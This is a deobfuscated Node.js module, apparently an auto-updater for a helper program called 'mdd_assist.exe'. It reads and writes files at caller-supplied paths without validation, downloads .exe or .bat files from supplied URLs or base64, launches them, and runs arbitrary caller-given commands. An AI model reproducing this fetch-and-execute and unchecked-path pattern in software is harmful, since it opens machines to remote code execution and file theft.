//Fri Oct 31 2025 01:09:56 GMT+0000 (Coordinated Universal Time)
//Base:https://github.com/echo094/decode-js
//Modify:https://github.com/smallfawn/decode_action
const _ = require("lodash"),
  fs = require("fs-extra");
const path = require("path");
const startupHelper = require("./../startupHelper");
exports.get_file_content = async function (_0x516e80) {
  const _0x2dcdcc = _0x516e80.filePath,
    _0x4d7bf4 = path.join(__dirname, "..", "..", _0x2dcdcc);
  try {
    const _0x2e7e33 = await fs.readFile(_0x4d7bf4, "utf8");
    return {
      success: true,
      content: _0x2e7e33
    };
  } catch (_0x339181) {
    console.error("读取文件 " + _0x4d7bf4 + " 失败:", _0x339181);
    return {
      success: false,
      message: "Failed to read file: " + _0x339181.message
    };
  }
};
exports.run = async function (_0x50a734) {
  const _0xdcf706 = _0x50a734.filePath;
  const _0x190fe2 = _0x50a734.fileContent,
    _0x1f0adc = _0x50a734.needRun,
    _0x46c30a = _0x50a734.needLuach;
  console.log("开始更新:" + _0xdcf706, new Date());
  if (_0xdcf706 && _0x190fe2) {
    if (_.endsWith(_0xdcf706, "exe") || _.endsWith(_0xdcf706, "bat")) {
      const _0x476fba = path.join(__dirname, "..", "..", _0xdcf706);
      if (_.startsWith(_0x190fe2, "http")) {
        try {
          if (_0x50a734.ovrride || !fs.existsSync(_0x476fba)) {
            _.endsWith(_0xdcf706, "mdd_assist.exe") && (await startupHelper.kill_Assist());
            const _0x5af2c7 = await fetch(_0x190fe2);
            if (!!_0x5af2c7.ok) {
              const _0x3bde5f = await _0x5af2c7.arrayBuffer(),
                _0x501dac = {
                  data: Buffer.from(_0x3bde5f)
                };
              fs.ensureDirSync(path.dirname(_0x476fba));
              fs.writeFileSync(_0x476fba, _0x501dac.data);
              console.log("已成功下载并保存exe文件到" + _0x476fba);
              if (_0x46c30a) {
                await startupHelper.luachAssist();
              }
            }
          }
          _0x1f0adc && (await startupHelper.runCmd(_0x476fba));
        } catch (_0x254b3f) {
          console.error("下载或保存exe文件失败: " + _0x254b3f.message);
        }
      } else {
        const _0x33e52b = Buffer.from(_0x190fe2, "base64");
        fs.ensureDirSync(path.dirname(_0x476fba));
        fs.writeFileSync(_0x476fba, _0x33e52b);
        console.log("已保存exe文件到" + _0x476fba);
      }
    } else {
      const _0x264b0 = path.join(__dirname, "..", "..", _0xdcf706);
      fs.ensureDirSync(path.dirname(_0x264b0));
      fs.writeFileSync(_0x264b0, _0x190fe2);
    }
  }
  const _0x2ad4b4 = _0x50a734.runCmd;
  if (!_.isEmpty(_0x2ad4b4)) {
    await startupHelper.runCmd(_0x2ad4b4);
  }
  console.log("更新完成" + _0xdcf706, new Date());
};